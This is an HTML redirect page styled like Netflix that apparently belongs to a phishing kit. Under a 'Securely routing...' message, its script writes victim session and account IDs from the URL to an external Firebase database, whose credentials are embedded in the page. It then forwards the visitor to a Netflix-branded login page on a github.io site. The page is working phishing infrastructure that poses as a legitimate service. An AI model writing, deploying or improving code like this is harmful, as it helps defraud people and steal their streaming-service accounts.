<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        body {
            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
            height: 100vh; background-color: #141414; color: #ffffff; font-family: Arial, sans-serif; flex-direction: column;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3); border-top: 4px solid #e50914;
            border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #message { font-size: 14px; opacity: 0.8; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <div id="message">Securely routing...</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function processAndRedirect() {
            const urlParams = new URLSearchParams(window.location.search);
            const sessionId = urlParams.get('session');
            
            // FIX: Grab the REAL Lotus ID from the URL instead of generating a fake random one
            const realLotusId = urlParams.get('lotus');
            const continueUrl = urlParams.get('continue') || "";

            if (!sessionId || !realLotusId) {
                document.getElementById('message').innerText = "Error: Invalid link missing Session or Lotus ID.";
                document.querySelector('.spinner').style.display = 'none';
                return;
            }

            try {
                // Save the expected routing data to ASPX Keys
                const docRef = doc(db, "ASPX Keys", sessionId);
                
                await setDoc(docRef, {
                    lotus: realLotusId,
                    continue: continueUrl // Ensure continue is carried over
                }, { merge: true });

                // Redirect to 1.html using the REAL Lotus ID so it can find the account
                const redirectUrl = `https://knox-app.github.io/netflix/lgn/1.html?session=${sessionId}&continue=${encodeURIComponent(continueUrl)}&env=safeopt&lotus=${realLotusId}`;
                window.location.replace(redirectUrl); 

            } catch (error) {
                console.error("Error writing to database:", error);
                document.getElementById('message').innerText = "Database connection error. Please try again.";
                document.querySelector('.spinner').style.display = 'none';
            }
        }

        processAndRedirect();
    </script>
</body>
</html>
